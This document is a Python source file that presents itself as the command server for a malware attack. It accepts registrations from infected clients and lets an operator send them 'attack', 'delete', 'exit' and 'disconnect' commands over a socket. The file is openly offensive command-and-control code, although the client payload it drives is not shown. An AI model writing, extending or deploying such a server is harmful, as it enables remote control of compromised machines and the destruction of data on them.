## This is the server. 
## Issue commands to the client for the malware attack
## After sending the command, shut down self

import socket
import json
import signal
import sys

HOST = "localhost"
PORT = 65432

def close_connection(conn, addr):
    print(f"Closing connection to {addr}...")
    conn.close()
    print(f"Connection to {addr} closed.")

def shutdown_server(server):
    print("Shutting down the server...")
    server.close()
    sys.exit(0)

def signal_handler(sig, frame, server):
    shutdown_server(server)

def main():
    ## I had issues with the port staying open after disconnecting. Add these lines
    signal.signal(signal.SIGINT, lambda sig, frame: signal_handler(sig, frame, server))
    signal.signal(signal.SIGTERM, lambda sig, frame: signal_handler(sig, frame, server))

    print("Server listening on port:", PORT)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((HOST, PORT))
        server.listen()

        while True:
            print("Waiting for a connection...")
            conn, addr = server.accept()
            connection_open = True
            with conn:
                try:
                    initial_data = conn.recv(1024).decode()  # Initial registration
                    registration_info = json.loads(initial_data)
                    print(f"Connection: {addr}, Hostname: {registration_info['hostname']}, Time: {registration_info['timestamp']}")

                    while connection_open:
                        command = input("Enter command (attack/delete/exit/disconnect): ")
                        conn.send(command.encode())

                        if command in ['attack', 'exit', 'delete', 'disconnect']:
                            if command == 'disconnect':
                                shutdown_server(server)
                            else:
                                close_connection(conn, addr)
                            connection_open = False

                except ConnectionResetError:
                    print("Client disconnected :-( \n Listening for new connection.\n")
                except Exception as e:
                    print(f"Unexpected error: {e}")
                finally:
                    if connection_open:
                        close_connection(conn, addr)

if __name__ == "__main__":
    main()

